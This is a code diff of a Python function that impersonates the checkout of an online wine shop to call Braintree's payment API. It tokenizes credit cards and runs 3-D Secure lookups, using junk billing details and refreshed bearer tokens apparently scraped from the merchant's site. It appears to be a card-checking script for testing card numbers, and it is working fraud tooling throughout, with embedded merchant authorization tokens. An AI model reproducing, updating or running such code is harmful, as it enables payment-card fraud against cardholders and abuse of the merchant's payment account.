@@ -14,7 +14,7 @@ def process_sum(command_data):
         headers = {
     'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mzc0MjU5MDksImp0aSI6IjQ5OWYwMGFlLTM4NTEtNDFhZS1hMmNhLWZkMjY2YTUxNTlhMyIsInN1YiI6Impmbjk2OGc2cXI4N2ZqcTkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Impmbjk2OGc2cXI4N2ZqcTkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IndpbmVwbGF0Zm9ybVVTRCJ9fQ.J1JC71BLq0JgNqgL6I8yYRzQEXiXN7wLcF2A3asoDN3e56q-UhUHXpk_jTEZGJOIiCLo6KsFpqDHNcVSrWCYHg',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mzc1MzM0NDcsImp0aSI6IjYwMDNiNTRlLWQ1YWMtNDliMy05MDc0LTFjZjliYjRhZGVjZiIsInN1YiI6Impmbjk2OGc2cXI4N2ZqcTkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Impmbjk2OGc2cXI4N2ZqcTkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IndpbmVwbGF0Zm9ybVVTRCJ9fQ.9IjqIRsEhAWnFU4oct6P7KV2SqtVETVvJz3Srsi2p_zzImVhDFmjfi9ftT5_eRMNjF940HjCUuRzy2IiEA-D2g',
     'braintree-version': '2018-05-10',
     'content-type': 'application/json',
     'origin': 'https://shop.ciprianidrinks.com',
@@ -27,12 +27,12 @@ def process_sum(command_data):
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'cross-site',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-}       
+}
         json_data = {
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '753c4e37-4881-4b1b-8591-5963883f2fe8',
+        'sessionId': 'ebb89708-b8d6-4639-b77c-80cf8167bb5d',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -68,15 +68,15 @@ def process_sum(command_data):
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'cross-site',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-}   
+}
         json_data = {
-    'amount': '77.57',
+    'amount': '107.53',
     'additionalInfo': {
         'acsWindowSize': '03',
-        'billingLine1': 'awfawf',
-        'billingCity': 'gawfawfaw',
+        'billingLine1': 'fawfawf',
+        'billingCity': 'fawfawfawf',
         'billingState': 'AL',
-        'billingPostalCode': '13321',
+        'billingPostalCode': '13211',
         'billingCountryCode': 'US',
         'billingPhoneNumber': '21312412',
         'billingGivenName': 'fadaw',
@@ -84,15 +84,15 @@ def process_sum(command_data):
         'email': 'myzyvy@azuretechtalk.net',
     },
     'bin': biin,
-    'dfReferenceId': '0_8b5da131-317d-4d19-9b45-ef31cafa287d',
+    'dfReferenceId': '0_4ada3e11-f3d3-4c97-a2a7-50ecd053b9cf',
     'clientMetadata': {
         'requestedThreeDSecureVersion': '2',
         'sdkVersion': 'web/3.103.0',
-        'cardinalDeviceDataCollectionTimeElapsed': 119,
-        'issuerDeviceDataCollectionTimeElapsed': 2514,
+        'cardinalDeviceDataCollectionTimeElapsed': 66,
+        'issuerDeviceDataCollectionTimeElapsed': 3638,
         'issuerDeviceDataCollectionResult': True,
     },
-    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mzc0MjU5MDksImp0aSI6IjQ5OWYwMGFlLTM4NTEtNDFhZS1hMmNhLWZkMjY2YTUxNTlhMyIsInN1YiI6Impmbjk2OGc2cXI4N2ZqcTkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Impmbjk2OGc2cXI4N2ZqcTkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IndpbmVwbGF0Zm9ybVVTRCJ9fQ.J1JC71BLq0JgNqgL6I8yYRzQEXiXN7wLcF2A3asoDN3e56q-UhUHXpk_jTEZGJOIiCLo6KsFpqDHNcVSrWCYHg',
+    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mzc1MzM0NTEsImp0aSI6Ijc1MzNjMDhjLTJjYjgtNDUxNS1iNTdkLTgzZDQ5NDRiZDE4MSIsInN1YiI6Impmbjk2OGc2cXI4N2ZqcTkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Impmbjk2OGc2cXI4N2ZqcTkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IndpbmVwbGF0Zm9ybVVTRCJ9fQ.ZmE1V3kMdL-4dY_hjFoQBrxnwYhAFvaGmYItifkjLPGTcvtE761ZZCW9E4zdY4UOkl_NT5avXyUxDBHQmwlUgw',
     'braintreeLibraryVersion': 'braintree/web/3.103.0',
     '_meta': {
         'merchantAppId': 'shop.ciprianidrinks.com',
@@ -101,8 +101,10 @@ def process_sum(command_data):
         'source': 'client',
         'integration': 'custom',
         'integrationType': 'custom',
-        'sessionId': '753c4e37-4881-4b1b-8591-5963883f2fe8',
-    },}
+        'sessionId': '5d8ca7a7-0e46-44d2-b50d-ced1ef198edb',
+    },
+}
+
         response = requests.post(f'https://api.braintreegateway.com/merchants/jfn968g6qr87fjq9/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',headers=headers,json=json_data,)
         challange = response.json(
         )['paymentMethod']['threeDSecureInfo']['status']
